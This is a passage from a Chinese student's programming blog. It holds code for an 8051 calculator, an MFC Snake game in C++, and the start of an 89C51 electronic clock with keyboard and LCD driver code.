decimalFlag_2 = 1;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 2 &amp;&amp; state == 1)&#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+temp_useless+1);</div><div class="line">			decimal_display();</div><div class="line">			tempKeytransfer_4 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x0F &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_4 = decimal_transfer(tempKeytransfer_4);</div><div class="line">				temp_decimal_useless = lcd_numdisplay(tempNumtransfer_4);	</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(step == 3)&#123;	</div><div class="line">			if(decimalFlag_1 * decimalFlag_2 == 0) &#123;</div><div class="line">				result = number_calculate(tempNumtransfer_1,tempNumtransfer_2,tempKeycode);</div><div class="line">				disp_line(1);</div><div class="line">				temp_useless = lcd_numdisplay(result);	</div><div class="line">		 	&#125;</div><div class="line">			if(decimalFlag_1 * decimalFlag_2 == 1) &#123;</div><div class="line">				result = number_calculate(tempNumtransfer_1,tempNumtransfer_2,tempKeycode);</div><div class="line">				decimal_result = number_calculate(tempNumtransfer_3,tempNumtransfer_4,tempKeycode);</div><div class="line">				disp_line(1);</div><div class="line">				if(decimal_result &gt; 9) &#123;</div><div class="line">					temp = lcd_numdisplay(result+1);</div><div class="line">					LcdWrCmd(0x80+0x40+temp);</div><div class="line">					decimal_display();</div><div class="line">					LcdWrCmd(0x80+0x40+temp+1);</div><div class="line">					temp_useless = lcd_numdisplay(decimal_result%10);</div><div class="line">				&#125;</div><div class="line">				else &#123;</div><div class="line">					temp = lcd_numdisplay(result);</div><div class="line">					LcdWrCmd(0x80+0x40+temp);</div><div class="line">					decimal_display();</div><div class="line">					LcdWrCmd(0x80+0x40+temp+1);</div><div class="line">					temp_useless = lcd_numdisplay(decimal_result);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>具体实现的思路大概就是前文讲的那样，可是程序结构的设计相当欠考虑，有很多做的不到位的地方，看起来很傻，耗费的时间太多。就这样。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/04/13/2016-04-13-mfc/" itemprop="url">
                  基于MFC框架的贪吃蛇程序
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-04-13T15:34:43+08:00" content="2016-04-13">
              2016-04-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/编程学习/" itemprop="url" rel="index">
                    <span itemprop="name">编程学习</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="MFC的作业"><a href="#MFC的作业" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>使用MFC的文本视图框架来写，实现贪吃蛇的基本功能：食物随机出现，键盘操作，蛇吃食物变长，蛇撞到边界和自己游戏结束，添加蛇身速度选择的按钮控件。   </p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>SnakeDoc.h和SnakeDoc.cpp中的变量声明与初始化如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">class CSnakeDoc : public CDocument</div><div class="line">&#123;</div><div class="line">protected: // create from serialization only</div><div class="line">	CSnakeDoc();</div><div class="line">	DECLARE_DYNCREATE(CSnakeDoc)</div><div class="line"></div><div class="line">// Attributes</div><div class="line">public:</div><div class="line">	struct&#123;</div><div class="line">	int body_x;</div><div class="line">	int body_y;</div><div class="line">	int direction;</div><div class="line">	int length;</div><div class="line">	&#125;snake[100];</div><div class="line"></div><div class="line">	struct&#123;</div><div class="line">	int food_x;</div><div class="line">	int food_y;</div><div class="line">	bool isfood;</div><div class="line">	&#125;food;</div><div class="line"></div><div class="line">	bool startFlag;</div><div class="line">	... //省略</div><div class="line">&#125;</div><div class="line">// Operations</div><div class="line">BOOL CSnakeDoc::OnNewDocument()</div><div class="line">&#123;</div><div class="line">	if (!CDocument::OnNewDocument())</div><div class="line">		return FALSE;</div><div class="line">	snake[0].body_x = 10;</div><div class="line">	snake[0].body_y = 10;</div><div class="line">	snake[1].body_x = 11;</div><div class="line">	snake[1].body_y = 10;</div><div class="line">	snake[2].body_x = 12;</div><div class="line">	snake[2].body_y = 10;</div><div class="line">	snake[0].direction = 3;</div><div class="line">	snake[0].length = 3;</div><div class="line">	food.isfood = true;</div><div class="line">	startFlag = false;</div><div class="line"></div><div class="line">	// TODO: add reinitialization code here</div><div class="line">	// (SDI documents will reuse this document)</div><div class="line"></div><div class="line">	return TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>蛇和食物用两个结构体来表示，snake[]结构体中包含了蛇的坐标和蛇身的长度(蛇是用方块组成，简单来说length表示构成蛇的方块数)。food结构体中包含了食物的坐标和食物是否出现的状态。   </p>
<p>视图类中的代码是这样的:  </p>
<pre><code class="c++"><span class="keyword">void</span> CSnakeView::OnDraw(CDC* pDC)
{
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    pDC-&gt;TextOut(<span class="number">20</span>,<span class="number">20</span>,<span class="string">"Hsmouc"</span>);
    pDC-&gt;TextOut(<span class="number">20</span>,<span class="number">50</span>,<span class="string">"Ocean University of China"</span>);
    CBrush DrawBrush=(RGB(<span class="number">130</span>,<span class="number">130</span>,<span class="number">0</span>));
    CBrush *Drawbrush=pDC-&gt;SelectObject(&amp;DrawBrush);
    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; i++){
        pDC-&gt;Rectangle(pDoc-&gt;snake[i].body_x*<span class="number">20</span>,pDoc-&gt;snake[i].body_y*<span class="number">20</span>,(pDoc-&gt;snake[i].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[i].body_y+<span class="number">1</span>)*<span class="number">20</span>);

    }
    pDC-&gt;SelectObject(DrawBrush);
    <span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>
}
<span class="keyword">void</span> CSnakeView::OnKeyDown(UINT nChar, UINT nRepCnt, UINT nFlags) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">switch</span>(nChar){
        <span class="keyword">case</span> VK_UP:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">2</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">1</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_DOWN:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">1</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">2</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_LEFT:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">4</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">3</span>;
            }
            <span class="keyword">break</span>;
        <span class="keyword">case</span> VK_RIGHT:
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction != <span class="number">3</span>){
                pDoc-&gt;snake[<span class="number">0</span>].direction = <span class="number">4</span>;
            }
            <span class="keyword">break</span>;
    }
    CView::OnKeyDown(nChar, nRepCnt, nFlags);
}

<span class="keyword">void</span> CSnakeView::OnTimer(UINT nIDEvent) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>
    CDC *pDC = GetDC();
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    CRect rectClient;
    GetClientRect(&amp;rectClient);
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> &lt;= rectClient.left || pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> &gt;= rectClient.right || pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> &lt;= rectClient.top || pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> &gt;= rectClient.bottom){
        KillTimer(<span class="number">1</span>);
        AfxMessageBox(<span class="string">"233"</span>);
        InvalidateRect(rectClient);
        pDoc-&gt;gameReset();
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].length &gt; <span class="number">3</span>){
        <span class="keyword">for</span>(<span class="keyword">int</span> temp = pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt; <span class="number">0</span> ; temp--){
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span>==pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                KillTimer(<span class="number">1</span>);
                AfxMessageBox(<span class="string">"233"</span>);
                InvalidateRect(rectClient);
                pDoc-&gt;gameReset();
            }
        }
    }
    pDC-&gt;SelectStockObject(WHITE_PEN);
    pDC-&gt;Rectangle(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x*<span class="number">20</span>,pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y*<span class="number">20</span>,(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y+<span class="number">1</span>)*<span class="number">20</span>);
    <span class="keyword">for</span>(<span class="keyword">int</span> i=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; i &gt; <span class="number">0</span> ; i--){
        pDoc-&gt;snake[i].body_x = pDoc-&gt;snake[i<span class="number">-1</span>].body_x;
        pDoc-&gt;snake[i].body_y = pDoc-&gt;snake[i<span class="number">-1</span>].body_y;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">1</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_y--;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">2</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_y++;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">3</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_x--;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">4</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_x++;
    }
    pDC-&gt;SelectStockObject(BLACK_PEN);

    CBrush DrawBrush = (RGB(<span class="number">130</span>,<span class="number">130</span>,<span class="number">0</span>));
    CBrush *Drawbrush = pDC-&gt;SelectObject(&amp;DrawBrush);
    pDC-&gt;Rectangle(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span>,pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span>,(pDoc-&gt;snake[<span class="number">0</span>].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[<span class="number">0</span>].body_y+<span class="number">1</span>)*<span class="number">20</span>);
    pDC-&gt;SelectObject(DrawBrush);
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> == pDoc-&gt;food.food_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;food.food_y*<span class="number">20</span>)
    {
        pDoc-&gt;snake[<span class="number">0</span>].length++;
        pDoc-&gt;food.isfood = <span class="literal">true</span>;
        pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x = pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-2</span>].body_x;
        pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y = pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-2</span>].body_y;
    }
    <span class="keyword">if</span>(pDoc-&gt;food.isfood == <span class="literal">true</span>)
    {
        srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));
        <span class="keyword">do</span>{
            <span class="keyword">for</span>(<span class="keyword">int</span> temp=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt;= <span class="number">0</span> ; temp--)
                <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> == pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                    pDoc-&gt;food.food_x=rand()%<span class="number">25</span>;
                    pDoc-&gt;food.food_y=rand()%<span class="number">25</span>;
                    <span class="keyword">for</span>(temp=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt;= <span class="number">0</span> ; temp--){
                        <span class="keyword">if</span>(pDoc-&gt;food.food_x*<span class="number">20</span> == pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;food.food_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                            temp = pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>;
                            pDoc-&gt;food.food_x=rand()%<span class="number">25</span>;
                            pDoc-&gt;food.food_y=rand()%<span class="number">25</span>;
                        }
                    }
                }
        }<span class="keyword">while</span>(pDoc-&gt;food.food_x*<span class="number">20</span> &lt; <span class="number">50</span> || pDoc-&gt;food.food_y*<span class="number">20</span> &lt; <span class="number">50</span> || pDoc-&gt;food.food_x*<span class="number">20</span> &gt; rectClient.right<span class="number">-100</span> || pDoc-&gt;food.food_y*<span class="number">20</span> &gt; rectClient.right<span class="number">-100</span>);
        pDC-&gt;Rectangle(pDoc-&gt;food.food_x*<span class="number">20</span>,pDoc-&gt;food.food_y*<span class="number">20</span>,(pDoc-&gt;food.food_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;food.food_y+<span class="number">1</span>)*<span class="number">20</span>);
        pDoc-&gt;food.isfood = <span class="literal">false</span>;
    }
    CView::OnTimer(nIDEvent);
}
<span class="keyword">void</span> CSnakeView::OnLButtonDown(UINT nFlags, CPoint point) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default    </span>
    CView::OnLButtonDown(nFlags, point);
}

<span class="keyword">void</span> CSnakeView::OnEasy() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">400</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnCrazy() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnHard() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">200</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnNormol() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">300</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnStart() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    pDoc-&gt;startFlag = <span class="literal">true</span>;
    SetTimer(<span class="number">1</span>,<span class="number">300</span>,<span class="literal">NULL</span>); <span class="comment">//normal    </span>
}



<span class="keyword">void</span> CSnakeView::OnPause() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    KillTimer(<span class="number">1</span>);    
}



<span class="keyword">void</span> CSnakeView::OnStop() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    AfxMessageBox(<span class="string">"Have a nice day!"</span>);
    ASSERT(AfxGetApp()-&gt;m_pMainWnd != <span class="literal">NULL</span>);
    AfxGetApp()-&gt;m_pMainWnd-&gt;SendMessage(WM_CLOSE);

}
</code></pre>
<p>让蛇动起来的方式是使用定时器，和以前我做过的卫星和小车大同小异。在这个程序中，蛇前进的方式是通过定时器计时，每过相同的时间，将蛇身部分的位置依次向前传递，用白色的画笔擦去蛇的最后一节。吃食物的时候把食物当成蛇新的头，同时数组长度增加1。  </p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个程序比较繁琐……</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/04/12/2016-04-12-clock/" itemprop="url">
                  基于89C51的电子时钟设计
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-04-12T20:34:43+08:00" content="2016-04-12">
              2016-04-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/嵌入式开发/" itemprop="url" rel="index">
                    <span itemprop="name">嵌入式开发</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="电子系统设计实验课–电子钟"><a href="#电子系统设计实验课–电子钟" class="headerlink" title="电子系统设计实验课–电子钟"></a>电子系统设计实验课–电子钟</h2><p>代码是用C写的，写的很烂，基本没有考虑优化的问题。因为只有一个周的时间，我还要上蛋疼的雅思课，所以忽略函数的胡乱调用与变量的命名吧。<br>这个电子钟实现了如下功能:   </p>
<ul>
<li>时间的精确走动</li>
<li>时分秒年月日都可以通过键盘调节</li>
<li>秒表功能    </li>
</ul>
<p>做好的效果图是这样的：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f2u9bwuytwj31kw16oax2.jpg" alt=""></p>
<h3 id="硬件设计"><a href="#硬件设计" class="headerlink" title="硬件设计"></a>硬件设计</h3><p>整体来说用了一块89C51，用hc165来读键盘的信息，hc164来将输入的串行数据转并行输出，送LCD显示。读键值的原理图如下:<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f2u8dwplkvj30jd0bctan.jpg" alt="">(乱码是什么鬼)<br>下面这张是hc164送显示的原理图:<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f2u8fxnfg7j30jz0bi40y.jpg" alt=""> (乱码又是什么鬼)</p>
<h3 id="软件设计"><a href="#软件设计" class="headerlink" title="软件设计"></a>软件设计</h3><p>大体上来说整个程序有两个部分:直接控制硬件的驱动层和我们实现电子钟功能的函数应用层。我们把它们分别放在DRI文件夹下和USR文件夹下。   </p>
<h4 id="驱动层设计"><a href="#驱动层设计" class="headerlink" title="驱动层设计"></a>驱动层设计</h4><p>(°_°)我要放源代码了:   </p>
<h5 id="hc165的底层控制代码"><a href="#hc165的底层控制代码" class="headerlink" title="hc165的底层控制代码"></a>hc165的底层控制代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">sbit hc165_sdo=P1^5;</div><div class="line">sbit hc165_sclk=P1^6;</div><div class="line">sbit hc165_pl=P1^7;</div><div class="line"></div><div class="line">unsigned char key=0x3e;</div><div class="line"></div><div class="line">void hc165_init()&#123;</div><div class="line">	hc165_sdo=1;</div><div class="line">	hc165_sclk=0;</div><div class="line">	hc165_pl=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unsigned char hc165_re(void)&#123;</div><div class="line">	unsigned i,x=0;</div><div class="line">	hc165_pl=0;</div><div class="line">	x=x+0;</div><div class="line">	hc165_pl=1;</div><div class="line">	if( hc165_sdo == 1 )</div><div class="line">		x = x + 1;</div><div class="line">	for( i = 0;i &lt; 7;i ++)&#123;</div><div class="line">		hc165_sclk=1;</div><div class="line">		x = x &lt;&lt; 1;</div><div class="line">		hc165_sclk=0;</div><div class="line">		if( hc165_sdo == 1 )</div><div class="line">			x = x + 1;</div><div class="line">	&#125;</div><div class="line">	return x;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="hc164-LCD显示的底层控制代码"><a href="#hc164-LCD显示的底层控制代码" class="headerlink" title="hc164(LCD显示的底层控制代码)"></a>hc164(LCD显示的底层控制代码)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line">extern int data second[3];</div><div class="line">unsigned char timedisplay[14]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;;</div><div class="line">sbit LCD_E = P1^2;</div><div class="line">sbit LCD_RW = P1^1;</div><div class="line">sbit LCD_RS = P1^0;</div><div class="line">sbit HC164_SDAT = P1^3;</div><div class="line">sbit HC164_SCLK = P1^4;</div><div class="line">extern clockTypeDef clock;</div><div class="line">char position = 0;</div><div class="line">unsigned char flash = 0;</div><div class="line">unsigned char j = 0;</div><div class="line">unsigned char code ascii[]=&#123;&quot;0123456789&quot;&#125;;</div><div class="line">void send_data(unsigned char dat) &#123;</div><div class="line">	unsigned char i;</div><div class="line">	for(i = 0; i &lt; 8; i++)&#123;</div><div class="line">		HC164_SCLK = 0;</div><div class="line">		if(dat &amp; 0x80)&#123;</div><div class="line">			HC164_SDAT = 1;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			HC164_SDAT = 0;</div><div class="line">		&#125;</div><div class="line">		HC164_SCLK = 1;</div><div class="line">		dat = dat &lt;&lt; 1;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Delay1ms(unsigned int c) &#123;</div><div class="line">	unsigned char a,b;</div><div class="line">	for(; c&gt;0; c--) &#123;</div><div class="line">		for(b = 199; b &gt; 0; b--) &#123;</div><div class="line">			for(a = 1; a &gt; 0; a--);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdWrCmd(unsigned char com) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 0;</div><div class="line">	LCD_RW = 0;</div><div class="line">	</div><div class="line">	send_data(com);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line">void LcdWrData(unsigned char dat) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 1;</div><div class="line">	LCD_RW = 0;</div><div class="line"></div><div class="line">	send_data(dat);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void disp_line(unsigned char line) &#123;</div><div class="line">	if(line == 0)&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x00);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x40);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdInit()&#123;</div><div class="line">	LcdWrCmd(0x38);</div><div class="line">	